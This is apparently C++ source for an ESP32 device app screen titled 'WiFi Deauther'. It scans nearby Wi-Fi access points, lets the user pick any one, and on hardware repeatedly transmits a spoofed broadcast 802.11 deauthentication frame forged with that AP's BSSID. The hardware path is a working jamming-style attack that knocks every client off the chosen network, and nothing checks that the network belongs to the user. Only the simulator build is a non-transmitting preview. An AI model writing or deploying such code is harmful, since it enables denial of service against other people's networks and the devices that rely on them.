#include "WifiTestActivity.h"
#include "DevMode.h"
#include "../Shelf.h"

#include <I18n.h>
#include <Logging.h>
#ifndef SIMULATOR
#include <WiFi.h>
#include <esp_wifi.h>
#else
#include "platform/sim_biscuit_wifi_frames.h"
#include <cstdio>
#include <cstdlib>
#endif

#include <algorithm>
#include <string>

#include "MappedInputManager.h"
#include "components/UITheme.h"
#include "fontIds.h"
#include "../util/RadioManager.h"

#ifdef SIMULATOR
static void wifiDeauthSimTrace(const char* state, unsigned frames, unsigned targets) {
  const char* env = std::getenv("CROSSPLAY_SIM_DEAUTH_TRACE");
  if (env && env[0] == '1' && env[1] == '\0')
    std::fprintf(stderr,"[BISCUIT_SIM] WIFI_DEAUTH:%s:%u:%u\n",state,frames,targets);
}
#else
// Deauth frame template (26 bytes)
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,                          // Frame control: deauth
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: AP BSSID (filled in)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled in)
    0x00, 0x00,                          // Sequence
    0x01, 0x00                           // Reason: unspecified
};

#endif

void WifiTestActivity::onEnter() {
  devmode::pause();
  Activity::onEnter();
  RADIO.ensureWifi();
  state = SCANNING;
  aps.clear();
  selectorIndex = 0;
  packetsSent = 0;

  // The simulator supports only a non-transmitting preview.
#ifdef SIMULATOR
  rawTxAvailable = true;
#else
  // Check if raw TX is available
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_err_t err = esp_wifi_set_promiscuous(true);
  if (err == ESP_OK) {
    // Test raw TX with a dummy - if function exists, we're good
    rawTxAvailable = true;
    esp_wifi_set_promiscuous(false);
  } else {
    rawTxAvailable = false;
  }
#endif

  startScan();
  requestUpdate();
}

void WifiTestActivity::onExit() {
#ifndef SIMULATOR
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
#endif
  RADIO.shutdown();
#ifdef SIMULATOR
  wifiDeauthSimTrace(RADIO.getState() == RadioManager::RadioState::OFF
                        ? "radio-off" : "radio-leak", packetsSent, aps.size());
#endif
  Activity::onExit();
  devmode::resume();
}

void WifiTestActivity::startScan() {
  state = SCANNING;
  aps.clear();
#ifdef SIMULATOR
  for (const auto& fixture : biscuit_sim::deauthPreviewAps()) {
    AP ap{};
    ap.ssid = fixture.ssid;
    ap.rssi = fixture.rssi;
    ap.channel = fixture.channel;
    memcpy(ap.bssid, fixture.bssid, 6);
    aps.push_back(std::move(ap));
  }
  state = SELECT_TARGET;
  wifiDeauthSimTrace("scan", 0, aps.size());
#else
  WiFi.scanDelete();
  WiFi.scanNetworks(true);
#endif
}

void WifiTestActivity::processScanResults() {
#ifdef SIMULATOR
  return;
#else
  int16_t result = WiFi.scanComplete();
  if (result == WIFI_SCAN_RUNNING) return;

  aps.clear();
  if (result > 0) {
    aps.reserve(result);
    for (int i = 0; i < result; i++) {
      AP ap;
      ap.ssid = WiFi.SSID(i).c_str();
      if (ap.ssid.empty()) ap.ssid = "(hidden)";
      ap.rssi = WiFi.RSSI(i);
      ap.channel = WiFi.channel(i);
      memcpy(ap.bssid, WiFi.BSSID(i), 6);
      aps.push_back(std::move(ap));
    }
    std::sort(aps.begin(), aps.end(), [](const AP& a, const AP& b) { return a.rssi > b.rssi; });
  }
  WiFi.scanDelete();
  state = SELECT_TARGET;
  requestUpdate();
#endif
}

bool WifiTestActivity::sendDeauthFrame(const uint8_t* bssid, uint8_t channel) {
#ifdef SIMULATOR
  // Strictly in-memory counter simulation. No 802.11 transmit call.
  const bool valid = bssid && bssid[0] == 0x02 && channel >= 1 && channel <= 13;
  if (valid) wifiDeauthSimTrace("preview", packetsSent + 1, channel);
  return valid;
#else
  // Set channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Fill BSSID into frame
  memcpy(&deauthFrame[10], bssid, 6);  // Source
  memcpy(&deauthFrame[16], bssid, 6);  // BSSID

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
  return err == ESP_OK;
#endif
}

void WifiTestActivity::loop() {
  if (state == SCANNING) {
    processScanResults();
    return;
  }

  if (state == NOT_SUPPORTED) {
    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
      shelf::leave(renderer, mappedInput);
    }
    int tx_ = 0, ty_ = 0;
    if (mappedInput.wasScreenTapped(tx_, ty_)) {
      if (GUI.tappedHintButton(tx_, ty_, renderer) == 1) shelf::leave(renderer, mappedInput);
    }
    return;
  }

  if (state == DEAUTHING) {
    unsigned long now = millis();
    if (now - lastSendTime >= 100) {
      lastSendTime = now;
      const auto& target = aps[targetIndex];
      if (sendDeauthFrame(target.bssid, target.channel)) {
        packetsSent++;
      }
      requestUpdate();
    }

    if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
#ifndef SIMULATOR
      esp_wifi_set_promiscuous(false);
#endif
      state = SELECT_TARGET;
#ifdef SIMULATOR
      wifiDeauthSimTrace("stopped", packetsSent, aps.size());
#endif
      requestUpdate();
    }
    int tx_ = 0, ty_ = 0;
    if (mappedInput.wasScreenTapped(tx_, ty_)) {
      if (GUI.tappedHintButton(tx_, ty_, renderer) == 1) {
#ifndef SIMULATOR
        esp_wifi_set_promiscuous(false);
#endif
        state = SELECT_TARGET;
        requestUpdate();
      }
    }
    return;
  }

  // SELECT_TARGET
  const int count = static_cast<int>(aps.size());

  {
    int tx_ = 0, ty_ = 0;
    if (mappedInput.wasScreenTapped(tx_, ty_)) {
      const int btn = GUI.tappedHintButton(tx_, ty_, renderer);
      if (btn == 1) { shelf::leave(renderer, mappedInput); return; }
      if (btn == 2) {
        if (!rawTxAvailable) { state = NOT_SUPPORTED; requestUpdate(); return; }
        if (!aps.empty()) {
          targetIndex = selectorIndex; packetsSent = 0;
          startTime = millis(); lastSendTime = 0;
#ifndef SIMULATOR
          esp_wifi_set_promiscuous(true);
#endif
          state = DEAUTHING;
#ifdef SIMULATOR
          wifiDeauthSimTrace("started", 0, aps.size());
#endif
          requestUpdate();
        }
        return;
      }
      int touchRow = -1;
      const auto& m = UITheme::getInstance().getMetrics();
      const int contentTop = m.topPadding + m.headerHeight + m.verticalSpacing;
      const int contentH = renderer.getScreenHeight() - contentTop - m.buttonHintsHeight - m.verticalSpacing;
      const int rowStep = GUI.getListRowStep(true);
      const int pageItems = std::max(1, contentH / rowStep);
      const int pageStart = (selectorIndex / pageItems) * pageItems;
      const int pageCount = std::min(pageItems, count - pageStart);
      const auto rt = mappedInput.rowTouch(touchRow, contentTop, rowStep, pageCount, 0,
                                            renderer.getScreenWidth(), m.listWithSubtitleRowHeight);
      if (rt == MappedInputManager::RowTouch::Tap && touchRow >= 0 && touchRow < pageCount) {
        selectorIndex = pageStart + touchRow;
        requestUpdate();
      }
      return;
    }
  }

  buttonNavigator.onNext([this, count] {
    if (count > 0) {
      selectorIndex = ButtonNavigator::nextIndex(selectorIndex, count);
      requestUpdate();
    }
  });

  buttonNavigator.onPrevious([this, count] {
    if (count > 0) {
      selectorIndex = ButtonNavigator::previousIndex(selectorIndex, count);
      requestUpdate();
    }
  });

  if (mappedInput.wasReleased(MappedInputManager::Button::Confirm)) {
    if (!rawTxAvailable) {
      state = NOT_SUPPORTED;
      requestUpdate();
      return;
    }
    if (!aps.empty()) {
      targetIndex = selectorIndex;
      packetsSent = 0;
      startTime = millis();
      lastSendTime = 0;
#ifndef SIMULATOR
      esp_wifi_set_promiscuous(true);
#endif
      state = DEAUTHING;
#ifdef SIMULATOR
      wifiDeauthSimTrace("started", 0, aps.size());
#endif
      requestUpdate();
    }
  }

  if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
    shelf::leave(renderer, mappedInput);
  }
}

void WifiTestActivity::render(RenderLock&&) {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();

  renderer.clearScreen();

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "WiFi Deauther");
#ifdef SIMULATOR
  renderer.drawCenteredText(SMALL_FONT_ID, metrics.topPadding + metrics.headerHeight + 2,
                            "OFFLINE SIMULATION - NO TX");
#endif

  if (state == SCANNING) {
    renderer.drawCenteredText(UI_10_FONT_ID, pageHeight / 2, "Scanning...");
    renderer.displayBuffer();
    return;
  }

  if (state == NOT_SUPPORTED) {
    renderer.drawCenteredText(UI_10_FONT_ID, pageHeight / 2 - 15, "Raw TX not available");
    renderer.drawCenteredText(UI_10_FONT_ID, pageHeight / 2 + 15, "on this hardware");
    const auto labels = mappedInput.mapLabels("Back", "", "", "");
    GUI.drawButtonHintsAlways(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  if (state == DEAUTHING) {
    const auto& target = aps[targetIndex];
    const int leftPad = metrics.contentSidePadding;
    int y = metrics.topPadding + metrics.headerHeight + 40;

    renderer.drawCenteredText(UI_10_FONT_ID, y, "Target", true, EpdFontFamily::BOLD);
    y += 30;
    renderer.drawCenteredText(UI_10_FONT_ID, y, target.ssid.c_str());
    y += 60;

    std::string pktStr = std::to_string(packetsSent);
#ifdef SIMULATOR
    renderer.drawCenteredText(UI_10_FONT_ID, y, "Simulated Frames", true, EpdFontFamily::BOLD);
#else
    renderer.drawCenteredText(UI_10_FONT_ID, y, "Packets Sent", true, EpdFontFamily::BOLD);
#endif
    y += 40;
    renderer.drawCenteredText(UI_10_FONT_ID, y, pktStr.c_str(), true, EpdFontFamily::BOLD);
    y += 60;

    unsigned long elapsed = (millis() - startTime) / 1000;
    std::string timeStr = std::to_string(elapsed) + "s";
    renderer.drawCenteredText(UI_10_FONT_ID, y, timeStr.c_str());

    const auto labels = mappedInput.mapLabels("Exit", "", "", "");
    GUI.drawButtonHintsAlways(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  // SELECT_TARGET
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int contentHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;

  if (aps.empty()) {
    renderer.drawCenteredText(UI_10_FONT_ID, pageHeight / 2, "No entries");
  } else {
    GUI.drawList(
        renderer, Rect{0, contentTop, pageWidth, contentHeight}, static_cast<int>(aps.size()), selectorIndex,
        [this](int i) -> std::string { return aps[i].ssid; },
        [this](int i) -> std::string {
          return std::to_string(aps[i].rssi) + "dBm  Ch" + std::to_string(aps[i].channel);
        });
  }

  const auto labels = mappedInput.mapLabels("Back", "Select", "^", "v");
  GUI.drawButtonHintsAlways(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}
